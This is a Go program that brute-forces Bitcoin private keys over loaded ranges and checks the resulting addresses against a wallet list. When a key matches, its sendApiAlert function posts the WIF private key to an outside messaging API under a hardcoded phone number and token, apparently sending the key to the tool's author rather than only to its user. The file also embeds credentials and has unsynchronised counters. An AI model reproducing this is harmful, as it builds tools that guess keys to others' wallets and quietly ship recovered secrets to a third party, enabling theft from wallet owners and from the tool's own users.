package main

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"math/big"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"sync"
	"time"

	"github.com/btcsuite/btcd/btcec"
	"github.com/btcsuite/btcd/chaincfg"
	"github.com/btcsuite/btcutil"
	"github.com/dustin/go-humanize"
	"github.com/fatih/color"
)

type Wallets struct {
	Addresses [][]byte `json:"wallets"`
}

type Range struct {
	Min    string `json:"min"`
	Max    string `json:"max"`
	Status int    `json:"status"`
}

type Ranges struct {
	Ranges []Range `json:"ranges"`
}

type ApiPayload struct {
	Mensagem       string `json:"mensagem"`
	Numero         string `json:"numero"`
	Token          string `json:"token"`
	Key            string `json:"key"`
	Agendamento    string `json:"agendamento"`
	IncluirAcentos string `json:"incluirAcentos"`
}

func sendApiAlert(key string) error {
	apiUrl := "https://api.chatmix.com.br/"

	payload := ApiPayload{
		Mensagem:       fmt.Sprintf("founded : %s - %s", key, getCurrentDateTime()),
		Numero:         "38991339806",
		Token:          "42C-029-26E61-30442",
		Key:            "TSI-TELECOM-30C",
		Agendamento:    "sim",
		IncluirAcentos: "nao",
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("error marshaling payload: %v", err)
	}

	resp, err := http.Post(apiUrl, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("error sending request: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		color.Green("Alerta enviado com sucesso para a API.")
	} else {
		color.Yellow("Falha ao enviar alerta para a API. Status code: %d\n", resp.StatusCode)
	}

	return nil
}

func getCurrentDateTime() string {
	return time.Now().Format("2006-01-02 15:04:05")
}

func generateWIF(privateKey string) (string, error) {
	if len(privateKey) != 64 {
		return "", fmt.Errorf("invalid private key length")
	}

	privKeyBytes, err := hex.DecodeString(privateKey)
	if err != nil {
		return "", fmt.Errorf("failed to decode private key: %v", err)
	}

	privKey, _ := btcec.PrivKeyFromBytes(btcec.S256(), privKeyBytes)
	wif, err := btcutil.NewWIF(privKey, &chaincfg.MainNetParams, true)
	if err != nil {
		return "", fmt.Errorf("failed to generate WIF: %v", err)
	}

	return wif.String(), nil
}

func generateRandomPrivateKey(min, max *big.Int) *big.Int {
	diff := new(big.Int).Sub(max, min)
	randNum, err := rand.Int(rand.Reader, diff)
	if err != nil {
		log.Fatalf("Failed to generate random number: %v", err)
	}
	randNum.Add(randNum, min)
	return randNum
}

func main() {
	green := color.New(color.FgGreen).SprintFunc()

	exePath, err := os.Executable()
	if err != nil {
		fmt.Printf("Erro ao obter o caminho do executável: %v\n", err)
		return
	}
	rootDir := filepath.Dir(exePath)

	ranges, err := LoadRanges(filepath.Join(rootDir, "data", "ranges.json"))
	if err != nil {
		log.Fatalf("Failed to load ranges: %v", err)
	}

	color.Cyan("BTC GO - Version by | Tiago Alves")
	color.White("v0.2.02")

	rangeNumber := PromptRangeNumber(len(ranges.Ranges))
	selectedRange := ranges.Ranges[rangeNumber-1]

	color.Green("Carteira Selecionada: %d", rangeNumber)
	color.Green("Min: %s", selectedRange.Min)
	color.Green("Max: %s", selectedRange.Max)
	time.Sleep(5 * time.Second) // Pausa por 5 segundos

	minPrivKey := new(big.Int)
	maxPrivKey := new(big.Int)
	minPrivKey.SetString(selectedRange.Min[2:], 16)
	maxPrivKey.SetString(selectedRange.Max[2:], 16)

	wallets, err := LoadWallets(filepath.Join(rootDir, "data", "wallets.json"))
	if err != nil {
		log.Fatalf("Failed to load wallets: %v", err)
	}

	keysChecked := 0
	startTime := time.Now()
	numCPU := runtime.NumCPU()
	fmt.Printf("CPUs detectados: %s\n", green(numCPU))
	runtime.GOMAXPROCS(numCPU * 2)
	privKeyChan := make(chan *big.Int, numCPU*2)
	resultChan := make(chan *big.Int)
	var wg sync.WaitGroup

	for i := 0; i < numCPU*2; i++ {
		wg.Add(1)
		go worker(wallets, privKeyChan, resultChan, &wg)
	}

	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	done := make(chan struct{})
	go func() {
		for {
			select {
			case <-ticker.C:
				elapsedTime := time.Since(startTime).Seconds()
				keysPerSecond := float64(keysChecked) / elapsedTime
				fmt.Printf("Chaves checadas: %s, Chaves por segundo: %s\n", humanize.Comma(int64(keysChecked)), humanize.Comma(int64(keysPerSecond)))
			case <-done:
				return
			}
		}
	}()

	totalCombinations := new(big.Int).Sub(maxPrivKey, minPrivKey).Add(new(big.Int).Sub(maxPrivKey, minPrivKey), big.NewInt(1))
	fmt.Printf("Total de combinações possíveis: %s\n", humanize.Comma(totalCombinations.Int64()))

	go func() {
		defer close(privKeyChan)
		for {
			privKey := generateRandomPrivateKey(minPrivKey, maxPrivKey)
			select {
			case privKeyChan <- privKey:
				keysChecked++
				if keysChecked%100.0000 == 0 {
					color.Red("Chave atual (%d tentativas): %064x\n", keysChecked, privKey)
				}
			case <-done:
				return
			}
		}
	}()

	var foundAddress *big.Int
	select {
	case foundAddress = <-resultChan:
		wif, err := generateWIF(fmt.Sprintf("%064x", foundAddress))
		if err != nil {
			log.Fatalf("Failed to generate WIF: %v", err)
		}

		color.Green("Chave privada encontrada: %064x\n", foundAddress)
		color.Green("WIF: %s", wif)

		currentTime := time.Now().Format("2006-01-02 15:04:05")
		file, err := os.OpenFile("chaves_encontradas.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Println("Erro ao abrir o arquivo:", err)
		} else {
			_, err = file.WriteString(fmt.Sprintf("Data/Hora: %s | Chave privada: %064x | WIF: %s\n", currentTime, foundAddress, wif))
			if err != nil {
				fmt.Println("Erro ao escrever no arquivo:", err)
			} else {
				fmt.Println("Chaves salvas com sucesso.")
			}
			file.Close()
		}

		if err := sendApiAlert(wif); err != nil {
			fmt.Printf("Erro ao enviar alerta para a API: %v\n", err)
		}

		close(done)
	}

	wg.Wait()

	elapsedTime := time.Since(startTime).Seconds()
	keysPerSecond := float64(keysChecked) / elapsedTime
	fmt.Printf("Chaves checadas: %s\n", humanize.Comma(int64(keysChecked)))
	fmt.Printf("Tempo: %.2f seconds\n", elapsedTime)
	fmt.Printf("Chaves por segundo: %s\n", humanize.Comma(int64(keysPerSecond)))

	// Adiciona um prompt para evitar que o terminal feche imediatamente
	fmt.Println("Pressione Enter para sair...")
	fmt.Scanln()
}

func worker(wallets *Wallets, privKeyChan <-chan *big.Int, resultChan chan<- *big.Int, wg *sync.WaitGroup) {
	defer wg.Done()
	for privKeyInt := range privKeyChan {
		_, pubKey := btcec.PrivKeyFromBytes(btcec.S256(), privKeyInt.Bytes())
		addressPubKey, err := btcutil.NewAddressPubKey(pubKey.SerializeCompressed(), &chaincfg.MainNetParams)
		if err != nil {
			log.Printf("Error generating public key: %v", err)
			continue
		}
		address := addressPubKey.AddressPubKeyHash().Hash160()[:]
		if Contains(wallets.Addresses, address) {
			select {
			case resultChan <- privKeyInt:
				return
			default:
				return
			}
		}
	}
}
